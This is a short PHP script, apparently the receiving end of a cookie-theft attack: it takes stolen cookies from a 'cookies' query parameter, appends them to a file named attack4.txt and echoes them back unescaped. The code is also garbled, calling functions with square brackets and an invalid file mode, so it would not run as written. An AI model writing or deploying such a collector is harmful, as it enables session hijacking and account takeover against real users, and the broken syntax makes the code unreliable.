<?php 
$fp= fopen['attack4.txt','&'];
fwrite[$fp,$_GET['cookies']];
fclose[$fp];

echo $_GET['cookies'];
?>
